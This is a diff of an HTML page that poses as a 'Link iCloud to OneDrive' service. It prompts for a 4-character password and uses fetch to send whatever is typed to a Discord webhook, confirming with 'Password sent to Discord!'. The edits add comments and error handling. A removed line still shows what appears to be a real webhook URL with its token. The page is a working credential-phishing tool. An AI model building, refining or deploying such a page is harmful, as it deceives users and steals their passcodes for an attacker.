@@ -29,20 +29,20 @@
         }
 
         .logo-container {
-            margin-bottom: 30px; /* Increased space between logo and text */
+            margin-bottom: 30px;
         }
 
         .icon {
-            width: 80px; /* Larger logo */
+            width: 80px;
             height: auto;
         }
 
         .logo-text {
-            font-size: 32px; /* Header-size text */
+            font-size: 32px;
             font-weight: bold;
-            color: black; /* Text color changed to black */
-            letter-spacing: 2px; /* Sleek and modern look */
-            margin-top: 10px; /* Space between logo and text */
+            color: black;
+            letter-spacing: 2px;
+            margin-top: 10px;
         }
 
         .input-container {
@@ -100,9 +100,7 @@
 <body>
     <div class="container">
         <div class="logo-container">
-            <!-- Logo image -->
             <img src="icon.png" alt="icon" class="icon" />
-            <!-- Text below the logo -->
             <div class="logo-text">Link iCloud to OneDrive</div>
         </div>
 
@@ -115,30 +113,37 @@
     <script>
         const inputBar = document.getElementById('inputBar');
         const sendButton = document.getElementById('sendButton');
-        const webhookURL = 'https://discord.com/api/webhooks/1476593239489380425/nMB8IjDYAlmDA4nxO0ATnP5rl_TBrGXPLaa0yScWSOBBQk173JgerhDZAqnNGubgd5l7'; // Replace with your Discord webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
 
+        // Masking behavior for the input
         inputBar.addEventListener('input', function() {
             let value = inputBar.value;
             let maskedValue = '•'.repeat(value.length) + '_'.repeat(4 - value.length);
             inputBar.setAttribute('placeholder', maskedValue);
         });
 
+        // Focus and blur events to handle placeholder behavior
         inputBar.addEventListener('focus', () => {
             inputBar.placeholder = '';
         });
 
         inputBar.addEventListener('blur', () => {
-            inputBar.placeholder = 'Enter password';
+            if (inputBar.value.length === 0) {
+                inputBar.placeholder = 'Enter password';
+            }
         });
 
+        // Button click event to send the data to Discord
         sendButton.addEventListener('click', () => {
             const password = inputBar.value;
 
+            // Check if the password length is exactly 4 characters
             if (password.length === 4) {
                 const payload = {
-                    content: `Password entered: ${password}`,
+                    content: `Password entered: ${password}`, // Send the passcode as message
                 };
 
+                // Send data to Discord webhook using fetch
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: {
@@ -148,20 +153,22 @@
                 })
                 .then(response => {
                     if (!response.ok) {
-                        return Promise.reject('Failed to send message');
+                        return response.text().then(errorText => {
+                            throw new Error(`Error from Discord: ${errorText}`);
+                        });
                     }
                     return response.json();
                 })
                 .then(data => {
                     alert('Password sent to Discord!');
-                    inputBar.value = '';
+                    inputBar.value = ''; // Clear input field after sending
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    alert(`Error sending to Discord: ${error}`);
+                    alert(`Error sending to Discord: ${error.message}`);
                 });
             } else {
-                alert('Please enter a 4-character password.');
+                alert('Please enter a valid 4-character password.');
             }
         });
     </script>
